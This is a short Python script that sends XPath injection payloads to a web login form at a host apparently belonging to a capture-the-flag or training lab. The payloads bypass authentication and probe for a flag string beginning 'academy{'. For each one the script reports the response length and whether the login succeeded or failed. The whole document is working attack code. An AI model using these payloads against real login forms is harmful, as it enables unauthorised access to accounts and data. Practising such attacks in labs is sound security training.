import sys, requests, urllib3, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://xebec.cylabacademy.net:36284/"
for name in ["' or //*[contains(.,\"academy\")] or 'x'='",
             "' or //*[contains(.,\"academy{\")] or 'x'='",
             "' or 1=1 or 'x'='",
             "admin"]:
    try:
        r = requests.post(BASE, data={"name": name, "pass": "asdf"}, timeout=20)
        print("%-50s -> %d | right path=%s | failure=%s" % (
            name[:50], len(r.text), "right path" in r.text, "Login failure" in r.text))
    except Exception as e:
        print(name[:40], "ERR", type(e).__name__)
